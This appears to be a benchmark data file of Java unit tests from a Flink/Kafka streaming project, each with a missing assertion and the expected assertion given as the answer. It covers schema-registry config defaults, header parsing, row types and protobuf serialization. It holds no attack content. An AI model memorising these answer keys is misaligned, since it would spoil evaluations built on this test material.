"shouldReturnLongPollingIfRefreshStrategyConfigIsInvalid() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, ""xyz""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(SchemaRefreshStrategy.longPollingStrategy().getClass(), stencilConfig.getRefreshStrategy().getClass())
"shouldReturnConfiguredValueIfFetchBackoffMinMsConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, ""7800""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(7800), stencilConfig.getFetchBackoffMinMs())
"shouldReturnDefaultValueIfFetchBackoffMinMsConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Long.valueOf(60000), stencilConfig.getFetchBackoffMinMs())
"shouldReturnConfiguredValueIfFetchRetriesConfigIsSet() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, ""9""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(9), stencilConfig.getFetchRetries())
"shouldReturnDefaultValueIfFetchRetriesConfigIsNotSet() { Map<String, String> configMap = new HashMap<>();  Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(Integer.valueOf(4), stencilConfig.getFetchRetries())
"shouldReturnEmptyHeadersIfHeadersConfigIsNotSet() { Map<String, String> configMap = new HashMap<>(); Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldReturnEmptyHeadersIfHeadersConfigIsEmpty() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_HEADERS_KEY, """"); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldReturnEmptyHeadersIfKeyValuePairsNotValid() { Map<String, String> configMap = new HashMap<String, String>() {{ put(SCHEMA_REGISTRY_STENCIL_FETCH_HEADERS_KEY, "" : , : ::: : ,, :: , keyWithoutValue: , : valueWithoutKey, k1 : v1 : v2 ,, ""); }}; Configuration config = getConfig(configMap); StencilClientOrchestrator stencilClientOrchestrator = new StencilClientOrchestrator(config); StencilConfig stencilConfig = stencilClientOrchestrator.createStencilConfig(); ""<AssertPlaceHolder>""; }
createStencilConfig() { return StencilConfig.builder() .fetchHeaders(getHeaders(configuration)) .fetchTimeoutMs(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS, SCHEMA_REGISTRY_STENCIL_FETCH_TIMEOUT_MS_DEFAULT)) .cacheAutoRefresh(configuration.getBoolean(SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_AUTO_REFRESH_DEFAULT)) .cacheTtlMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_KEY, SCHEMA_REGISTRY_STENCIL_CACHE_TTL_MS_DEFAULT)) .refreshStrategy(getSchemaRefreshStrategy(configuration.getString(SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_KEY, SCHEMA_REGISTRY_STENCIL_REFRESH_STRATEGY_DEFAULT))) .fetchBackoffMinMs(configuration.getLong(SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_BACKOFF_MIN_MS_DEFAULT)) .fetchRetries(configuration.getInteger(SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_KEY, SCHEMA_REGISTRY_STENCIL_FETCH_RETRIES_DEFAULT)) .build(); }"	assertEquals(0, stencilConfig.getFetchHeaders().size())
"shouldUpdateCountAndReturnTheCorrectCountValue() { Counter simpleCounter = new SimpleCounter(); when(metricGroup.addGroup(""counterTest"")).thenReturn(metricGroup); when(metricGroup.counter(""test_aspect3"")).thenReturn(simpleCounter); counterStatsManager.registerAspects(TestAspects.values(), ""counterTest""); counterStatsManager.inc(TestAspects.TEST_ASPECT_THREE); counterStatsManager.inc(TestAspects.TEST_ASPECT_THREE); long count = counterStatsManager.getCount(TestAspects.TEST_ASPECT_THREE); ""<AssertPlaceHolder>""; }
getCount(Aspects aspect) { return counters.get(aspect).getCount(); }"	assertEquals(2, count)
"shouldAlwaysReturnFalseForEndOfStream() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }""; ""<AssertPlaceHolder>""; }
isEndOfStream(Row nextElement) { return false; }"	"assertFalse(new JsonDeserializer(jsonSchema, ""time"").isEndOfStream(null))"
"shouldGiveAllColumnTypesOfJsonAlongWithRowtime() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertArrayEquals( new TypeInformation[]{STRING, SQL_TIMESTAMP, BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) jsonType.getRowType()).getFieldTypes())
"shouldGiveAllColumnNamesOfJsonAlongWithRowtimeAndInvalidField() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""integer"" }, ""random"": { ""description"": ""one random field"", ""type"": ""integer"" } }, ""required"": [ ""id"", ""time"", ""random"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertArrayEquals( new String[]{""id"", ""time"", ""random"", ""__internal_validation_field__"", ""rowtime""}, ((RowTypeInfo) jsonType.getRowType()).getFieldNames())"
"shouldGiveAllTypesOfFieldsAlongWithRowtime() { String jsonSchema = ""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""integer"" }, ""random"": { ""description"": ""one random field"", ""type"": ""integer"" } }, ""required"": [ ""id"", ""time"", ""random"" ] }""; JsonType jsonType = new JsonType(jsonSchema, ROWTIME);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = JsonRowSchemaConverter.convert(jsonSchema);  return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertArrayEquals( new TypeInformation[]{STRING, BIG_DEC, BIG_DEC, BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) jsonType.getRowType()).getFieldTypes())
"shouldAlwaysReturnFalseForEndOfStream() { ""<AssertPlaceHolder>""; }
isEndOfStream(Row nextElement) { return false; }"	"assertFalse(new ProtoDeserializer(TestBookingLogKey.class.getTypeName(), 4, ""rowtime"", stencilClientOrchestrator).isEndOfStream(null))"
"shouldGiveAllTypesOfFieldsAlongWithRowtime() { ProtoType protoType = new ProtoType(""org.raystack.dagger.consumer.TestBookingLogKey"", ""rowtime"", stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertArrayEquals( new TypeInformation[]{STRING, STRING, STRING, STRING, ROW_NAMED(new String[]{""seconds"", ""nanos""}, LONG, INT), BOOLEAN, SQL_TIMESTAMP}, ((RowTypeInfo) protoType.getRowType()).getFieldTypes())"
"shouldProcessArrayForObjectData() { ProtoType bookingLogMessageProtoType = new ProtoType(TestBookingLogMessage.class.getName(), ""rowtime"", stencilClientOrchestrator);  TypeInformation[] fieldTypes = ((RowTypeInfo) bookingLogMessageProtoType.getRowType()).getFieldTypes(); TypeInformation<Row> locationType = ROW_NAMED(new String[]{""name"", ""address"", ""latitude"", ""longitude"", ""type"", ""note"", ""place_id"", ""accuracy_meter"", ""gate_id""}, STRING, STRING, DOUBLE, DOUBLE, STRING, STRING, STRING, FLOAT, STRING); TypeInformation<?> expectedRoutesRow = OBJECT_ARRAY(ROW_NAMED(new String[]{""startTimer"", ""end"", ""distance_in_kms"", ""estimated_duration"", ""route_order""}, locationType, locationType, FLOAT, ROW_NAMED(new String[]{""seconds"", ""nanos""}, LONG, INT), INT));  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertEquals(expectedRoutesRow, fieldTypes[bookingLogFieldIndex(""routes"")])"
"shouldProcessArrayForStringData() { ProtoType rowtime = new ProtoType(TestBookingLogMessage.class.getName(), ""rowtime"", stencilClientOrchestrator);  TypeInformation[] fieldTypes = ((RowTypeInfo) rowtime.getRowType()).getFieldTypes();  TypeInformation<?> registeredDeviceType = ObjectArrayTypeInfo.getInfoFor(STRING);  ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	"assertEquals(registeredDeviceType, fieldTypes[bookingLogFieldIndex(""meta_array"")])"
"shouldGiveAllNamesAndTypesIncludingPrimitiveArrayFields() { ProtoType testNestedRepeatedMessage = new ProtoType(TestNestedRepeatedMessage.class.getName(), ""rowtime"", stencilClientOrchestrator); ""<AssertPlaceHolder>""; }
getRowType() { TypeInformation<Row> rowNamed = TypeInformationFactory.getRowType(getProtoFieldDescriptor()); return addInternalFields(rowNamed, rowtimeAttributeName); }"	assertEquals(PRIMITIVE_ARRAY(INT), ((RowTypeInfo) testNestedRepeatedMessage.getRowType()).getFieldTypes()[3])
"shouldSerializeIntoKafkaRecord() { ProtoSerializer serializer = Mockito.mock(ProtoSerializer.class); String outputTopic = ""test""; Row element = new Row(1); element.setField(0, ""testing""); byte[] keyBytes = ""key"".getBytes(); byte[] valueBytes = ""value"".getBytes(); Mockito.when(serializer.serializeKey(element)).thenReturn(keyBytes); Mockito.when(serializer.serializeValue(element)).thenReturn(valueBytes); KafkaProtoSerializer kafkaProtoSerializer = new KafkaProtoSerializer(serializer, outputTopic); ProducerRecord<byte[], byte[]> record = kafkaProtoSerializer.serialize(element, null, null); ProducerRecord<byte[], byte[]> expectedRecord = new ProducerRecord<>(""test"", keyBytes, valueBytes); Assert.""<AssertPlaceHolder>""; }
serialize(Row row, KafkaSinkContext context, Long timestamp) { if (Objects.isNull(outputTopic) || outputTopic.equals("""")) { throw new DaggerSerializationException(""outputTopic is required""); } LOGGER.info(""row to kafka: "" + row); byte[] key = protoSerializer.serializeKey(row); byte[] message = protoSerializer.serializeValue(row); return new ProducerRecord<>(outputTopic, key, message); }"	assertEquals(expectedRecord, record)
"InvalidProtocolBufferException { String[] columnNames = {""customer_profile.customer_id""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestEnrichedBookingLogMessage""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestEnrichedBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator);  Row element = new Row(1);  element.setField(0, ""test-id"");  byte[] value = serializer.serializeValue(element);  TestEnrichedBookingLogMessage actualValue = TestEnrichedBookingLogMessage.parseFrom(value);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""test-id"", actualValue.getCustomerProfile().getCustomerId())"
"InvalidProtocolBufferException { String[] columnNames = {""blah.invalid"", ""customer_email""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(2); element.setField(0, ""order_number""); element.setField(1, ""customer_email@go-jek.com"");  byte[] valueBytes = serializer.serializeValue(element);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	"assertEquals(""customer_email@go-jek.com"", TestBookingLogMessage.parseFrom(valueBytes).getCustomerEmail())"
"shouldMapEmptyDataWhenFieldIsInvalidInTheQuery() { String[] columnNames = {""invalid""}; String outputProtoKey = ""org.raystack.dagger.consumer.TestBookingLogKey""; String outputProtoMessage = ""org.raystack.dagger.consumer.TestBookingLogMessage""; ProtoSerializer serializer = new ProtoSerializer(outputProtoKey, outputProtoMessage, columnNames, stencilClientOrchestrator); Row element = new Row(1); element.setField(0, ""order_number"");  byte[] valueBytes = serializer.serializeValue(element);  ""<AssertPlaceHolder>""; }
serializeValue(Row row) { return parse(row, getDescriptor(messageProtoClassName)).toByteArray(); }"	assertEquals(0, valueBytes.length)
